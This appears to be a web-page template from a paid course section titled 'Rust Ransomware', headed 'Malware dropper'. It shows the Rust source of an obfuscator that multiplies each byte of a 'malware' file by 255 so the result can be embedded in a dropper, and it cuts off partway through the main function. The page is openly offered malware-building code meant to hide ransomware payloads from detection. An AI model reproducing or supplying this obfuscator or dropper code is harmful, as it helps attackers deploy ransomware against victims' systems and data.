{{ define "sub-content" }}

<nav aria-label="breadcrumb">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="/vip">VIP</a></li>
    <li class="breadcrumb-item"><a href="/vip/projects">Projects</a></li>
    <li class="breadcrumb-item active">{{ t "Rust Ransomware" . }}</li>
  </ol>
</nav>

<h3>Malware dropper</h3>
<p>
</p>

<p>Full source code (rust):</p>

<h4 class="mt-5 mb-3">obfuscator/main.rs</h4>
<!-- Code begin -->
<div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
    <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></pre></td>
        <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">use</span> std::fs;
<span style="color:#66d9ef">use</span> std::io::Error;

<span style="color:#75715e">// Malware obfuscator takes the released &#34;malware&#34; and multiply each bytes by 255
</span><span style="color:#75715e"></span><span style="color:#75715e">// to produce the &#34;malware_obfuscated&#34; file that will be embedded inside the &#34;dropper&#34;
</span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">obfuscate</span>(input_path: &str, output_path: &str) -> Result<(), Error> {
    <span style="color:#66d9ef">let</span> content <span style="color:#f92672">=</span> fs::read(input_path)?;
    <span style="color:#66d9ef">let</span> obfuscated: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> content.iter().map(|c| c.wrapping_mul(<span style="color:#ae81ff">255</span>)).collect();
    fs::write(output_path, obfuscated)?;
    Ok(())
}

<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">let</span> _ <span style="color:#f92672">=</span> obfuscate(<span style="color:#e6db74">&#34;./malware&#34;</span>, <span style="color:#e6db7
